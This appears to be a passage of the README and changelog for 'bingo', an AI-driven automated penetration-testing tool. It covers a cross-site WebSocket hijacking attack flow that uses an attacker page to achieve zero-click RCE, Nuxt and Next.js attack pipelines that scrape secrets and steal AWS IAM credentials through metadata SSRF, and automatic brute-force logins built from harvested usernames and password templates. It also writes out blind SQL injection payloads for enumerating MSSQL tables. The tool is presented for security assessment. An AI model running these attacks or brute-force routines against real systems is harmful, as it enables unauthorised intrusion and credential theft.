bingo> cswsh poc ws://127.0.0.1:3100
bingo> dotnet strings target.exe
bingo> dotnet crypto target.exe
bingo> dotnet pipeline target.exe
```

---

### CSWSH Attack Flow

```
target.exe (installed on victim's machine)
    │
    └─ ws://127.0.0.1:3100 WebSocket server
          │ NO origin validation
          │
          ▼
    Attacker website (attacker.com/poc.html)
          │
          └─ JavaScript auto-connects on page load
                │
                └─ Sends: {"RUN": "DRIVE", "URL": "calc.exe"}
                      │
                      └─ Falls through to: explorer.exe "calc.exe"
                                │
                                └─ 💀 ZERO-CLICK RCE
```

---

### PowerShell String Dump (Windows)

bingo auto-generates a PowerShell reflection script to dump all US-heap strings natively on Windows:

```powershell
# Generated by: analyze_dotnet("target.exe") → result.powershell_dump_script
$asm = [System.Reflection.Assembly]::LoadFile("target.exe")
$module = $asm.GetModules()[0]
$offset = 0
while ($offset -lt 0x4000) {
    try {
        $token = 0x70000000 -bor $offset
        $str = $module.ResolveString($token)
        if ($str -and $str.Length -gt 2) {
            Write-Output ("US[0x" + $offset.ToString("x") + "]: " + $str)
        }
    } catch {}
    $offset += 2
}
```

---

### Skills Added (v2.3.5)

| Skill ID | Description | Trigger Keywords |
|----------|-------------|-----------------|
| `exe-dotnet-detect` | .NET assembly detection (CLR header, streams, embedded DLLs) | dotnet detect, clr header, bsjb, costura |
| `exe-dotnet-strings` | US-heap string dump + categorization + PowerShell script | dotnet strings, us heap, powershell reflection dump |
| `exe-dotnet-crypto` | AES key/IV detection via 16-byte adjacent-pair heuristic | dotnet crypto, aes key detect, 16 byte key, iv detection |
| `exe-localhost-ws` | Localhost WebSocket server discovery (exe + JS files) | localhost websocket, ws://127, ws port discovery |
| `cswsh-detect` | Cross-Site WebSocket Hijacking test (origin validation) | cswsh, websocket hijacking, origin validation |
| `cswsh-poc-gen` | CSWSH PoC HTML generator (zero-click RCE template) | cswsh poc, websocket rce, ws hijack poc |
| `exe-dotnet-pipeline` | Full .NET → string dump → crypto → WS → CSWSH → PoC | dotnet pipeline, voorivex, exe cswsh pipeline |

---

## Nuxt.js / Vue SPA Attack Toolkit (v2.3.12+)

Dedicated skill set for attacking **Nuxt.js** and **Vue SPA** applications.  
AI automatically selects these skills when the target is identified as Nuxt.js (via `/_nuxt/` paths, `__NUXT__` globals, `_payload.json` references).

### Attack Vectors

| Vector | What It Finds | Risk |
|--------|--------------|------|
| Source Map Leak (`/_nuxt/*.js.map`) | Original unminified source code, API endpoints, hardcoded secrets | **Critical** |
| `_payload.json` Enumeration | SSG data payloads with user data, tokens, DB records | **High** |
| `.env` / Config Exposure | API keys, DB URIs, JWT secrets, cloud credentials | **Critical** |
| Nuxt DevTools Detection | Debug interface with RPC access if left enabled in production | **High** |
| JS Chunk Secret Scan | OpenAI keys, AWS keys, MongoDB URIs, JWT tokens in client JS | **Critical** |
| API Route Extraction | Hidden `server/api/` routes revealed from source maps | **Medium** |
| AWS Metadata SSRF | IAM credentials via `169.254.170.23` on AWS App Runner targets | **Critical** |
| Build Artifact Exposure | `.output/`, `.nuxt/` directory listing and file access | **High** |

### How AI Auto-Selects

When bingo identifies any of these signals, it automatically runs `nuxt-full-pipeline`:
- URL contains `awsapprunner.com`, `nuxtjs.org`, or `vercel.app`
- Response HTML contains `/_nuxt/`, `__NUXT__`, or `_payload.json`
- Response headers include Nuxt/Vue framework fingerprints

### Usage

```bash
# Standard target — AI detects Nuxt automatically
bingo
Target> https://your-nuxt-app.awsapprunner.com

# Manual skill invocation
bingo
Target> https://target.com
> Use nuxt-full-pipeline skill

# Individual skill
> Use nuxt-sourcemap-leak skill
> Use nuxt-payload-dump skill
> Use nuxt-js-chunk-secrets skill
```

### Nuxt.js Skills Reference

| Skill ID | Description | Auto-Trigger Keywords |
|----------|-------------|----------------------|
| `nuxt-full-pipeline` | Full automated pipeline (all 8 checks) | nuxt, vue, spa, awsapprunner, /_nuxt/ |
| `nuxt-sourcemap-leak` | Discover & parse `*.js.map` for source code recovery | sourcemap, js.map, /_nuxt/ |
| `nuxt-payload-dump` | Enumerate `_payload.json` across all site pages | _payload.json, ssg, nuxt payload |
| `nuxt-env-exposure` | Check `.env`, `nuxt.config.*` file exposure | .env, nuxt.config, environment variable |
| `nuxt-devtools-detect` | Detect Nuxt DevTools left enabled in production | devtools, nuxt debug |
| `nuxt-api-route-extract` | Extract `server/api/` routes from JS chunks | api route, server/api, nuxt endpoint |
| `nuxt-aws-ssrf` | AWS App Runner metadata SSRF for IAM credential theft | aws ssrf, metadata, 169.254.170.23 |
| `nuxt-build-artifact` | Detect `.output/`, `.nuxt/` directory exposure | .output, nuxt build artifact |
| `nuxt-js-chunk-secrets` | Scan all JS chunks for hardcoded secrets & API keys | js chunk, hardcoded secret |

### Sample Output

```
[*] Nuxt.js Full Attack Pipeline — https://target.awsapprunner.com
======================================================================

[Phase 1] Fingerprinting...
  Nuxt.js: YES | Vue: YES
  Status: 200 | Size: 48291 bytes

[Phase 2] Source Map Discovery...
  [MAP SECRET] MongoDB URI: mongodb+srv://admin:P@ssw0rd@cluster0.xyz.mongodb.net

[Phase 3] JS Chunk Secret Scan...
  [OpenAI Key] sk-proj-abc123...xyz (chunk-BF2A91.js)
  [AWS Key] AKIAIOSFODNN7EXAMPLE (chunk-vendors.js)

[Phase 4] _payload.json Enumeration...
  [PAYLOAD] https://target.com/dashboard/_payload.json
    [!] SENSITIVE DATA detected in payload!

[Phase 5] Config File Exposure...
  [CONFIG] https://target.com/.env (843 bytes)

[PIPELINE COMPLETE] Summary:
  Secrets found:      7
  Payload files:      3
  Config exposed:     1
```

---

## Next.js / React Attack Toolkit (v2.3.13)

Dedicated skill set for attacking **Next.js** and **React** applications, including critical 2025 CVEs (React2Shell, Re-Cache SXSS, Host Header SSRF).  
AI automatically selects these skills when the target is identified as Next.js (via `__NEXT_DATA__`, `/_next/`, `Next-Action` headers, or Server Components `Rsc: 1`).

### Covered CVEs & Techniques

| CVE / Technique | Impact | Severity |
|-----------------|--------|----------|
| CVE-2025-55182 / CVE-2025-66478 (React2Shell) | Unauthenticated RCE via React Flight protocol deserialization | **Critical** |
| Re-Cache Excessive Reflection + 0-Click SXSS | Cache poisoning → stored XSS without user interaction | **High** |
| `__NEXT_DATA__` SSR Props Leakage | Sensitive data (tokens, API keys, PII) exposed in initial HTML | **High** |
| `_next/image` SSRF | Internal SSRF via permissive `remotePatterns` config | **High** |
| Server Action Enumeration & Replay | Enumerate `Next-Action` IDs, replay privileged mutations | **High** |
| CVE-2024-34351 Host Header SSRF | SSRF via Host header in Next.js Server Actions | **High** |
| RSC Fingerprinting | Detect React Server Components via `Rsc: 1` header | **Info** |
| RSC Type Confusion SXSS | Exploit `Content-Type` override on RSC endpoints for XSS | **High** |

### AI Auto-Selection Criteria

Bingo automatically triggers Next.js skills when it detects:
- `__NEXT_DATA__` in response HTML
- `/_next/static/` or `/_next/image` in response body
- `Next-Action` header in requests
- `x-nextjs-*` response headers
- RSC requests (`Rsc: 1` header)

### Usage

```bash
# Standard — AI auto-detects Next.js and selects skills
bingo
Target> https://your-nextjs-app.vercel.app

# Run full automated Next.js pipeline
> Use nextjs-full-pipeline skill

# Check for React2Shell RCE (CVE-2025-55182)
> Use nextjs-react2shell skill

# Scan __NEXT_DATA__ for leaked secrets
> Use nextjs-next-data-leak skill

# Test Server Actions for unauthorized replay
> Use nextjs-server-action skill

# Check for CVE-2024-34351 Host Header SSRF
> Use nextjs-host-ssrf skill
```

### Next.js / React Skills Reference

| Skill ID | Description | Auto-Trigger Keywords |
|----------|-------------|----------------------|
| `nextjs-full-pipeline` | Full Next.js recon + exploit pipeline (all 8 checks) | nextjs, react, /_next/, vercel, __NEXT_DATA__ |
| `nextjs-rsc-fingerprint` | Fingerprint RSC via `Rsc: 1` header | rsc, react server component, next.js, /_next/ |
| `nextjs-rsc-sxss` | 0-click SXSS via RSC cache poisoning & Content-Type confusion | sxss, cache poisoning, rsc, 0-click xss |
| `nextjs-react2shell` | CVE-2025-55182/66478 — React Flight protocol RCE detection | react2shell, cve-2025-55182, rce, react flight |
| `nextjs-next-data-leak` | Scan `__NEXT_DATA__` for secrets, tokens, PII | __NEXT_DATA__, ssr leak, next data |
| `nextjs-image-ssrf` | SSRF via `_next/image` permissive remotePatterns | _next/image, ssrf, image proxy |
| `nextjs-server-action` | Server Action enumeration & replay (Next-Action header) | server action, next-action, form action |
| `nextjs-host-ssrf` | CVE-2024-34351 Host Header SSRF in Server Actions | cve-2024-34351, host header ssrf, server actions |

### Sample Output

```
[nextjs-full-pipeline] Starting Next.js attack pipeline on https://target.vercel.app

[RSC Fingerprint] ✓ React Server Components detected (Rsc: 1 response)
[React2Shell] Testing CVE-2025-55182 multipart probe...
  → POST /__react_server_action__  [200] 847B
  ⚠ Suspiciously large RSC response — possible deserialization sink
[__NEXT_DATA__] Extracting SSR props...
  → Found: {"apiKey":"sk-...","userId":42,"session":"eyJ..."}
  ✓ API key leaked in __NEXT_DATA__
[Server Actions] Enumerating Next-Action IDs...
  → Found 3 action IDs: [abc123, def456, ghi789]
  → Replayed action abc123 as unauthenticated user → [200] Success

[PIPELINE COMPLETE] Summary:
  React2Shell: Potential RCE sink found
  SSR Leaks:   3 secrets in __NEXT_DATA__
  Actions:     1 unauthorized replay succeeded
```

---

## Dynamic `max_tokens` per Model (v2.3.16)

Bingo now **automatically adjusts the AI output token limit** based on the selected LLM provider.
Previously all models were capped at 4 096 tokens, causing Python scripts to be silently truncated mid-execution.  
From v2.3.16 onwards each provider has its own optimal ceiling:

| Provider | `max_tokens` | Reason |
|----------|-------------|--------|
| DeepSeek (`deepseek-v4-pro`) | **8 192** | V4 Pro supports up to 8 K output; prevents code truncation |
| Anthropic Claude | **16 000** | Claude 200K context window; safe output ceiling |
| OpenAI GPT (GPT-4o / GPT-5) | **16 384** | GPT-4o / GPT-5 series native 16 K output limit |
| Zhipu GLM | **8 192** | GLM-5 series 8 K output cap |
| Alibaba Qwen | **8 192** | Qwen3 series 8 K output cap |
| Ollama (local) | **8 192** | Conservative safe default for local models |
| Custom / unknown | **8 192** | Fallback safe value |

### How It Works

The logic lives entirely in `ModelRegistry.build()` — **no user action required**:

```python
# bingo/models/registry.py  (simplified)
if config.max_tokens <= 4096:          # user hasn't overridden the default
    config.max_tokens = info.get("max_tokens", 8192)   # apply provider optimum
```

- If you have **never touched** the token setting → Bingo upgrades it silently.  
- If you manually set a higher value (e.g. `32768`) → Bingo **respects your setting**.  
- Old configs (`max_tokens = 4096`) are automatically upgraded on the next run.

### Why It Matters

A 4 096-token ceiling means a single Python script block of ~250 lines fills the entire budget,
forcing the AI to stop mid-code with `# 脚本被截断` (script truncated) warnings.  
With 8 K – 16 K tokens the AI can generate complete, multi-function exploitation scripts without interruption.

### Manual Override

You can still pin a custom limit per session in `~/.config/bingo/config.json`:

```json
{
  "max_tokens": 32768
}
```

Any value **above 4 096** is treated as a deliberate override and is never auto-changed.

---

## Skill-Driven Dynamic Path Discovery (v2.3.17)

### The Problem

Previously Bingo's recon phase only probed **13 hard-coded paths** for admin panels:

```
/admin/, /admin/login/, /wp-admin/, /wp-login.php, /administrator/, ...
```

The 540-skill library contained rich path knowledge (e.g. `/admin/dashboard`,
`/api/coordinates`), but it was **only consulted during the final AI analysis step** —
long after active scanning had finished. The AI could say "you should scan
`/admin/dashboard`" but Bingo never actually scanned it.

### The Fix (v2.3.17)

Three new components wire the skill library directly into Phase 01:

| File | Role |
|------|------|
| `bingo/tools/path_dict.py` | Central path dictionary: 80+ admin paths, 60+ API paths, 35+ weak credentials, tech-stack overrides |
| `bingo/tools/http_probe.py` | New methods: `discover_api_endpoints()`, `brute_admin_login()`, `check_admin_panels(extra_paths=…)` |
| `bingo/redteam/phases/01_recon.py` | Loads path_dict **before scanning**, feeds tech-specific paths into every probe call |

### New Scan Pipeline

```
Phase 01 — Reconnaissance
  [1/8] Technology fingerprinting           ← determines tech stack
  [2/8] Path dictionary pre-load            ← skill knowledge loaded HERE
        → 80+ admin paths (tech-specific)
        → 60+ API paths
  [3/8] DNS / IP resolution
  [4/8] Subdomain enumeration (subfinder)
  [5/8] Sensitive file discovery
  [6/8] Admin panel scan (80+ paths)        ← was 13, now 80+
  [7/8] API endpoint unauthenticated scan   ← NEW: /api/coordinates etc.
  [8/8] Weak credential brute-force         ← NEW: lahyl:lahy12025 style
```

### Tech-Stack Aware Paths

Bingo automatically selects extra paths based on the detected stack:

| Technology | Extra Paths Added |
|------------|-------------------|
| WordPress | `/xmlrpc.php`, `/?author=1`, `/wp-json/wp/v2/users`, ... |
| Gnuboard | `/adm/`, `/g5/adm/`, `/bbs/login.php`, ... |
| Next.js | `/api/auth/session`, `/api/me`, `/api/v1/admin`, ... |
| Vue / Nuxt | `/api/coordinates`, `/api/config`, `/_nuxt/`, ... |
| Spring Boot | `/actuator/env`, `/actuator/heapdump`, `/v3/api-docs`, ... |
| Laravel | `/horizon/`, `/telescope/`, `/_ignition/health-check`, ... |
| Django | `/api-auth/login/`, `/api/v1/`, ... |
| ASP.NET | `/elmah.axd`, `/trace.axd`, `/swagger/ui/index`, ... |
| PHP | `/phpinfo.php`, `/config.php`, `/install.php`, ... |

### API Endpoint Unauthenticated Scan

All API paths from the skill library are now actively probed in Phase 01.
Endpoints returning **HTTP 200 with JSON** are flagged as **High** severity
(potential unauthenticated data exposure).  Endpoints returning **401** are
logged as **Info** (exists but requires auth).

```
[7/8] API endpoint scan (60 paths)...
  → /api/coordinates  [200] (JSON)  ← HIGH: unauthenticated access!
  → /api/users        [401]          ← INFO: exists, auth required
```

### Weak Credential Brute-Force

When a login form is discovered, Bingo automatically tests **domain-aware**
weak credentials — including patterns like `admin:sitename2025` that are
commonly found in real-world assessments.

```
[8/8] Weak credential brute-force (3 login forms, 35 passwords)...
  → /admin/login  admin:admin2025   [302]  ← CRITICAL!
```

No user configuration needed — everything is automatic and controlled by the
tech-stack fingerprint detected in Step 1.

---

## Runtime Infinite Loop Killer (**v2.3.30)

v2.3.23 fixed the AI prompt rules — but the loop was already running. **v2.3.30 adds **execution-layer enforcement** that kills infinite loops immediately, regardless of what the AI generated.

### New Runtime Protections (terminal.py)

| Protection | Mechanism | Trigger |
|-----------|-----------|---------|
| **Real-time duplicate killer** | Streaming output monitor counts consecutive identical lines | Same line 5× in a row → `p.terminate()` immediately |
| **Script timeout** | Per-script hard timeout | Script runs > 300s → killed |  
| **Pre-execution loop block** | Static analysis before execution | `for`+`range`+`TOP 1` query+no `seen=set()` → **blocked before run** |

### Before vs After

**Before (v2.3.22)**: Script runs 28 minutes, prints `ARREO_SMS` 383 times, terminal watches helplessly.

**After (**v2.3.30)**:
```
[U] ulsan$
[U] ulsan$
[U] ulsan$
[U] ulsan$
[U] ulsan$
🔁 Infinite loop: 'ulsan$' repeated 5x → KILLED

[SCRIPT_KILLED: INFINITE_LOOP]
MANDATORY FIX — cursor pagination pattern provided...
```

OR, if caught before execution:
```
🚫 [LOOP BLOCK #1] INFINITE_LOOP_RISK: for/range loop with TOP 1 query and no seen=set()
→ AI must rewrite with cursor pagination before any execution
```

### Correct Enumeration Pattern (enforced)

```python
seen = set()
last_hex = ''
while True:
    cursor_clause = f' AND name > {last_hex}' if last_hex else ''
    payload = f"AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55{cursor_clause})"
    result = extract(payload)
    if not result or result in seen:
        break  # exit when duplicate or empty
    seen.add(result)
    last_hex = '0x' + result.encode().hex().upper()
    print(result)
# Output: 14 unique tables (not 383 duplicates)
```

---

## SQLi Enumeration Engine Fixes (v2.3.22)

Analysis of real penetration test logs (MSSQL target, ASP Classic) revealed 5 new critical bugs in the SQL injection enumeration loop — all fixed.

### Fixes Applied

| # | Category | Problem | Fix |
|---|----------|---------|-----|
| 1 | **🔴 Critical Bug** | `SELECT TOP 1 name ... LIKE 'A%'` without cursor always returns the same first row → **infinite loop** printing the same table 100+ times | System prompt: mandatory cursor pagination (`AND name > {last_hex}`) + `seen=set()` dedup |
| 2 | **🔴 Critical Bug** | No deduplication logic — script never checks if a result was already seen | System prompt: `seen = set()` mandatory in all enumeration loops; break immediately on duplicate |
| 3 | **🔴 Critical Bug** | `NOT IN (hex...)` bypassed by WAF or hex malformed → same table returned 27 times | System prompt: if same result 2+ times, switch to `AND name > {cursor}` pagination instead |
| 4 | **🟡 Important** | `ADODB.Recordset 800a0cc1` error misidentified as failure — actually proves stacked queries execute | Runtime detector in `terminal.py`: now signals "stacked query opportunity", guides AI to use `EXEC`/`INSERT` not `SELECT` |
| 5 | **🟡 Important** | `IS_SRVROLEMEMBER` check returned ambiguous result, left unresolved | System prompt: alternative sysadmin checks (`SELECT SYSTEM_USER`, `sysprocesses loginame`) |
| 6 | **🟡 Important** | Boolean oracle: TRUE response ≠ baseline size (dynamic content) → oracle calibration skipped | System prompt: mandatory 3-step calibration (TRUE/FALSE/baseline) before any data extraction |

### New Runtime Detectors (terminal.py)

**ADODB 800a0cc1 — Stacked Query Signal:**
```
⚡ ADODB 800a0cc1 detected — semicolon stacked query IS executing!
NEXT: Use EXEC/INSERT (side-effect queries), not SELECT (causes recordset error)
```

**Infinite Loop Guard:**
```
🔁 Infinite loop warning: 'TABLE_NAME' repeating — dedup + pagination required!
Mandatory fix: cursor pagination pattern with seen=set() provided
```

### Table Enumeration Pagination (New Rule)

**Wrong (causes infinite loop):**
```python
for i in range(100):
    result = query("SELECT TOP 1 name FROM sysobjects WHERE name LIKE 'A%'")
    print(result)  # prints SAME_TABLE 100 times!
```

**Correct (cursor pagination):**
```python
seen = set()
last_hex = ''
while True:
    if last_hex:
        payload = f"AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55 AND name > {last_hex})"
    else:
        payload = "AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55)"
    result = extract(payload)
    if not result or result in seen:
        break  # EXIT on duplicate or empty
    seen.add(result)
    last_hex = '0x' + result.encode().hex().upper()
    print(result)
```

### Boolean Oracle Calibration (New Rule)

Before extracting data, bingo now mandates 3-step oracle validation:

```
Step 1: AND(1)=(1) → TRUE_SIZE
Step 2: AND(1)=(2) → FALSE_SIZE  
Step 3: normal param → BASE_SIZE

VALID oracle: TRUE_SIZE ≠ FALSE_SIZE (diff > 100B)
INVERTED oracle: if TRUE_SIZE == BASE_SIZE → flip condition logic
INVALID oracle: if TRUE_SIZE == FALSE_SIZE → find different injection point
```

---

## Penetration Test Accuracy Fixes (v2.3.21)

Analysis of real penetration test logs revealed 6 systematic errors — all fixed.

### Fixes Applied

| # | Category | Problem | Fix |
|---|----------|---------|-----|
| 1 | **False Positive** | DB names extracted from URL paths / domain names, not SQL error messages | System prompt: strict rule — DB names only from actual SQL error output |
| 2 | **False Positive** | Session cookie alone classified as "login success" | System prompt: login confirmed only when response contains logout link OR user ID |
| 3 | **Code Bug** | `r3 NameError` — variable from Block 2 referenced in Block 3 (different subprocess) | System prompt: self-contained block rule + `/tmp/bingo_state.json` handoff pattern |
| 4 | **Code Bug** | f-string backslash `SyntaxError` e.g. `f"val + \"'\" "` | Pre-execution syntax check + auto-fix via `compile()` in `terminal.py` |
| 5 | **Analysis Error** | VBScript errors `800a01a8` / `800a0d5d` misidentified as SQL injection opportunities | Runtime detector: these error codes now trigger "NOT INJECTABLE — stop testing this param" |
| 6 | **Network** | Request timeout treated same as WAF block; no distinction | Timeout signals now labeled "WAF silent drop" with chunked-encoding bypass hint |

### VBScript Error Classification (New)

ASP Classic sites return VBScript runtime errors when parameters are **not** injectable:

```
Error '800a01a8'  → Object required (VBScript logic error) — NOT SQLi
Error '800a0d5d'  → ADODB Type mismatch — PARAMETERIZED query — NOT injectable  ← most important
Error '8002000a'  → ADO stream error — NOT SQLi
Error '800a000d'  → VBScript type mismatch — NOT SQLi
```

When bingo detects these in script output, it now **automatically** notifies the AI to stop testing that parameter and move on — preventing wasted loops.

### SQL Injection Oracle Rules (New in System Prompt)

```
✅ Valid oracle: baseline response differs from TRUE/FALSE payloads predictably
❌ Invalid oracle: WAF 403/503 for payload ≠ boolean condition
❌ Invalid oracle: response size alone (must check content)
✅ Login confirmed: response contains logout link OR user ID in body
❌ Login NOT confirmed: Set-Cookie header alone
✅ DB name source: SQL error message (ORA-*, MySQL syntax error, etc.)
❌ DB name NOT from: URL path, domain name, page title
```

---

## Windows Compatibility Fixes (v2.3.20)

Five bugs reported by Windows users — all fixed with macOS/Linux safety guaranteed.

| # | File | Bug | Fix |
|---|------|-----|-----|
| 1 | `cli.py` | Korean/Chinese output causes `UnicodeEncodeError` on Windows GBK consoles | Force UTF-8 on `sys.stdout/stderr` at startup (`win32` only) |
| 2 | `session.py` | `write_text()` without `encoding=` crashes writing reports with CJK characters | Added `encoding="utf-8"` |
| 3 | `09_report.py` | Parameter named `vuln_type` but body uses `finding_type` → `NameError`; `cswsh_recs`, `redis_recs`, `autofill_recs`, `wcd_recs`, `ctr_recs` were dead code after `return` | Renamed param, moved all `_recs` dicts to function scope |
| 4 | `03_exploit.py` | `pipeline.py` falls back to `mod.run()` on `AttributeError` but `run()` didn't exist | Added `run()` compatibility wrapper |

### Platform Safety

The UTF-8 enforcement in `cli.py` is **Windows-only** (`if sys.platform == "win32"`):

```python
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
```

macOS and Linux are already UTF-8 by default — this block is never executed on them.

---

## JSON API Exposure Detection via Admin Path Scan (v2.3.20)

### The Problem

Even after v2.3.18, `/api/coordinates` was missed when it returned `200 OK` with
pure JSON because `check_admin_panels()` silently discarded responses that had no
`<form>` or `<input type="password">` element:

```
# OLD logic — discarded JSON 200 silently ❌
has_form = bool(re.search(r'<form|<input.*password', r.body))
# API endpoints never have forms → was thrown away
```

### The Fix (v2.3.20)

`check_admin_panels()` now classifies every response by `response_type` and returns
a proper `is_json` flag. `01_recon.py` Step 6 auto-routes JSON 200 responses as
**High-severity `api_endpoint`** findings before Step 7's dedicated API scan runs.

| `response_type` | Status | Action |
|-----------------|--------|--------|
| `json` | 200/201 | **→ `api_endpoint` High** — "Unauthenticated JSON data exposure" |
| `html_form` | 200 | → `admin_panel` High — login form found, brute-force queued |
| `html` | 200 | → `admin_panel` Medium |
| `redirect` | 301/302 | → `admin_panel` Medium |
| `auth` | 401/403 | → `admin_panel` Low |

### Before vs After

```
# BEFORE (v2.3.18)
[6/8] Admin panel scan (80 paths)...
  → /api/coordinates [200]  ← DISCARDED (no <form> found) ❌

# AFTER (v2.3.20)
[6/8] Admin panel scan (80 paths)...
  ⚠ 미인증 JSON 노출: /api/coordinates [200]   ← HIGH finding ✅
  → /admin/dashboard [200] html_form            ← admin panel ✅
[7/8] API endpoint scan (59 paths, 1 already found via admin scan)...
  → /api/users  [401]  ← exists but blocked
```

### Deduplication

Paths already detected as JSON in Step 6 are excluded from Step 7's scan to
avoid double-counting and wasted requests.

---

## Username Harvesting + Smart Brute-Force (v2.3.20)

### The Problem

Even after v2.3.17's 80-path scan, real-world credentials like `lahyl:lahy12025`
were missed because:

1. The username `lahyl` is **not** in any standard list (`admin`, `root`, etc.)
2. The password follows the pattern **first-4-chars-of-username + year**:  
   `lahyl` → `lahy` + `2025` = `lahy2025`

Bingo had no way to discover `lahyl` or generate `lahy2025` automatically.

### The Fix (v2.3.20)

Three targeted improvements:

| Component | What Changed |
|-----------|--------------|
| `http_probe.harvest_usernames()` | **NEW** — scrapes site for real usernames via email addresses, WordPress `/author/` slugs, `<meta author>`, Contact/About/Team pages |
| `path_dict.get_weak_credentials()` | Rewritten — cross-joins **all usernames** (standard + harvested) × **common password templates** |
| `01_recon.py` Step 8 | Calls `harvest_usernames()` first, then feeds results into credential generation; `max_attempts` raised to 50 |

### Password Template Engine

Every username is combined with every template. Templates support three placeholders:

| Placeholder | Expands To |
|-------------|-----------|
| `__USER__` | full username (e.g. `lahyl`) |
| `__USERSHORT__` | first 4 chars of username (e.g. `lahy`) |
| `__DOMAIN__` | domain name extracted from target URL (e.g. `example`) |

**Example — detecting `lahyl:lahy2025`:**

```
username  = "lahyl"         (harvested from Contact page email)
template  = "__USERSHORT__2025"
expanded  = "lahy" + "2025" = "lahy2025"   ← matches!
```

### Username Harvesting Sources

```
harvest_usernames()
  → Email addresses on homepage / Contact / About / Team pages
      → local-part before @ becomes candidate username
  → WordPress /?author=1…5 redirects → /author/<slug>/
  → <meta name="author" content="…"> tags
  → login form placeholder/value hints
```

### API 502 / 503 / 504 Handling

When an API path returns a proxy error, Bingo now classifies it as **Medium**
(backend service likely exists) instead of silently ignoring it:

```
[7/8] API endpoint scan (60 paths)...
  → /api/coordinates  [502]  ← MEDIUM: proxy error — backend service may exist
  → /api/users        [200]  ← HIGH:   unauthenticated JSON access!
  → /api/admin        [401]  ← INFO:   exists but requires auth
```

This means you no longer miss endpoints that are temporarily down or behind
an overloaded upstream service.

---

## License

MIT © 2026 bingook
